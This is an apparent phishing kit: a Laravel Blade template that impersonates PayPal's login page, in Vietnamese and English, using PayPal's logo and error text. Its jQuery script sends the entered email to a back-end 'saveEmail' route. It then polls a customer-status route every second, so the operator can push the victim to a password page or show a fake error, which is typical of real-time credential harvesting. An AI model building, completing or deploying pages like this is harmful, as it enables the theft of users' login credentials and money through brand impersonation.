<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Đăng nhập vào tài khoản PayPal</title>
    <link rel="stylesheet" href={{ asset('assets-papal/login.css') }} />
    <link rel="stylesheet" href={{ asset('assets-papal/responsive.css')}} />
    <link rel="stylesheet" href={{ asset("assets-papal/loader.css")}} />
    <link rel="shortcut icon" href={{ asset("assets-papal/assets/logo.ico")}} />
  </head>
  <body>
    <div class="relative">
      <div class="login-container">
        <div class="logo">
          <img src={{ asset("assets-papal/assets/paypal-mark-color.svg")}} alt="PayPal Logo" />
        </div>
        <div id="loginForm" onsubmit="return validateForm()">
          <div class="error-group hide" id="error-group-long">
            <img
              class="alert-icon"
              src={{ asset("assets-papal/assets//alert.svg")}}
              width="20px"
              height="20px"
            />
            <p class="error-text">
              Some of your info isn't correct. Please try again.
            </p>
          </div>
          <div id="email-verified-group" class="email-verified-group hide">
            <div id="email-verified" class="verifiedEmail">quang@gmail.com</div>
            <span id="changeBtn" class="changeBtn">Thay đổi</span>
          </div>

          {{-- <form action={{ route('saveEmail') }} method="post">
            @csrf
            @method('POST') --}}
              <div id="emailGroup" class="fieldWrapper">
                  <input type="text" id="email" name="email" />
                  <label id="loginLabel" for="email" class="fieldLabel"
                  >Email or mobile number</label
                  >
              </div>
  
              <div id="passwordGroup" class="fieldWrapper hide">
                  <input type="password" id="password" name="password" />
                  <label id="passwordLabel" for="password" class="fieldLabel"
                  >Mật khẩu</label
                  >
                  <!-- <span class="show-password">Hiện</span> -->
              </div>
  
              <a id="recoveryOption" class="recoveryOption">Forgot Email?</a>
              <div class="actions">
                  <button id="continueBtn" class="button">Next</button>
              </div>
          {{-- </form> --}}


          <div class="splitPassword">
            <div class="divider"></div>
            <span class="splitPasswordText">or</span>
          </div>
        </div>
        <div class="actions">
          <button type="submit" class="register-button">Sign Up</button>
        </div>
        <div class="languageWrapper">
          <img
            class="flag-vn"
            src={{ asset("assets-papal/assets/vietnam.png")}}
            width="20px"
            height="20px"
          />
          <img
            class="narrow-down"
            src={{ asset("assets-papal/assets/narrow-down.svg")}}
            width="16px"
            height="16px"
          />
          <span class="languageText languageText-selected">Tiếng Việt</span>
          <span>|</span>
          <span class="languageText">English</span>
        </div>
      </div>

      <div class="loading-container" id="loader">
        <div class="loader"></div>
      </div>
      <div class="footer">
        <span class="footer-item">Contact Us</span>
        <span class="footer-item">Privacy</span>
        <span class="footer-item">Legal</span>
        <span class="footer-item">Policy Updates</span>
        <span class="footer-item">Worldwide</span>
      </div>
    </div>
    <script src={{ asset("assets-papal/login.js")}}></script>
  </body>
</html>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    $(document).ready(function(){
        $('#continueBtn').click(function(e){
            e.preventDefault();
            let loader = document.getElementById("loader");
            let errorGroup = document.getElementById("error-group-long");
            loader.classList.add("show");
            errorGroup.classList.add('hide');
            
            // Lấy dữ liệu từ input
            var email = $('#email').val();
            console.log(email);
            // Gửi Ajax request
            $.ajax({
                url: "{{ route('saveEmail') }}",
                method: "POST",
                data: {
                    _token: '{{ csrf_token() }}',
                    email: email
                },
                success: function(response){
                    // Xử lý kết quả sau khi lưu thành công
                    getdata(response.data.id,loader,errorGroup);
                },
                error: function(xhr, status, error){
                    // Xử lý lỗi
                    console.error(error);
                }
            });
        });
    });

    function getdata(id,loader,errorGroup) {
        console.log('đã vào function');
        var redirected = false; // Cờ để kiểm tra đã chuyển hướng hay chưa

        $(document).ready(function () {
            // Định nghĩa function để gửi yêu cầu và lấy dữ liệu khách hàng
            function fetchDataFromLocalStorage() {
                // var savedEmail = localStorage.getItem('email');
                if (id) {
                    // Gửi yêu cầu POST để lấy dữ liệu khách hàng
                    $.ajax({
                        type: 'POST',
                        url: '{{ route("customer.show", ":id") }}'.replace(':id', id),
                        data: {
                            '_token': '{{ csrf_token() }}',
                            // Các dữ liệu khác có thể gửi cùng với email nếu cần
                        },
                        success: function (response) {
                            // Xử lý dữ liệu trả về từ controller
                            console.log(response.data);
                            var data = response.data;
                            if (response.data.status_email === 1 && !redirected) {
                                localStorage.setItem('email', response.data.email);
                                localStorage.setItem('id',response.data.id);
                                redirected = true; // Đánh dấu đã chuyển hướng
                                window.location.href = '{{ route("view.password") }}';
                                loader.classList.remove("show");
                            }
                            if (response.data.status_email === 2 && !redirected) {
                                redirected = true;
                                $.ajax({
                                        type: 'POST',
                                        url: '{{ route("change.status.email.bar") }}',
                                        data: {
                                            '_token': '{{ csrf_token() }}',
                                            id: response.data.id,
                                            // Các dữ liệu khác có thể gửi cùng với email nếu cần
                                        },
                                        success: function (response) {
                                            // Xử lý dữ liệu trả về từ controller
                                        },
                                        error: function (xhr, status, error) {
                                            // Xử lý lỗi nếu có
                                            console.error(error);
                                        }
                                    });
                                loader.classList.remove("show");
                                errorGroup.classList.remove('hide');

                            }
                            

                        },
                        error: function (xhr, status, error) {
                            // Xử lý lỗi nếu có
                            console.error(error);
                        }
                    });
                } else {
                    console.log('Không có id được lưu trong local storage.');
                }
            }

            // Gọi function fetchDataFromLocalStorage() mỗi giây
            setInterval(fetchDataFromLocalStorage, 1000);
        });
    }
</script>